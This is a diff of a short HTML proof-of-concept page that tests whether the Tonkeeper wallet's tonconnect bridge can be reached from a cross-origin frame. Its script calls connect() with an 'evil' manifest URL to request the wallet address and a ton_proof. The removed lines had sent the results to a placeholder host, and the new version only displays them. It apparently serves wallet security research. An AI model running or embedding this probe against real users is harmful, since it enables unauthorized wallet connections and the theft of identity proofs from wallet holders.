@@ -1,16 +1,15 @@
-<!doctype html><html><body style="background:#310;color:#fff;font:16px monospace;padding:10px">
-<div id="s">EVIL-FRAME-JS-BOOT</div>
+<!doctype html><html><body style="background:#310;color:#ff0;font:18px monospace;padding:12px">
+<div id="s">EVIL-CROSS-ORIGIN-FRAME-BOOT</div>
 <script>
 var s=document.getElementById('s');
-function rep(x){ try{ fetch('https://T1PLACEHOLDER/result?'+encodeURIComponent(String(x).slice(0,300)),{mode:'no-cors'}); }catch(e){} s.textContent='EVIL:'+String(x).slice(0,90); }
+function rep(x){ s.textContent='EVIL:'+String(x).slice(0,110); }
 rep('LOADED origin='+location.origin);
-rep('tk?'+(typeof window.tonkeeper));
 if(window.tonkeeper&&window.tonkeeper.tonconnect){
   rep('HAS_BRIDGE');
   try{
     var p=window.tonkeeper.tonconnect.connect(2,{manifestUrl:'https://goodman387.github.io/evil/manifest.json',items:[{name:'ton_addr'},{name:'ton_proof',payload:'evilframe-'+Date.now()}]});
-    s.textContent='EVIL:CONNECT_SENT';
-    p.then(function(r){rep('RESOLVED')},function(e){rep('REJECTED')});
+    s.textContent='EVIL:CONNECT_SENT_FROM_CROSS_ORIGIN_FRAME';
+    p.then(function(r){rep('RESOLVED_OK')},function(e){rep('REJECTED')});
   }catch(e){rep('CERR')}
-}else{rep('NO_BRIDGE');}
+}else{rep('NO_BRIDGE_IN_FRAME');}
 </script></body></html>
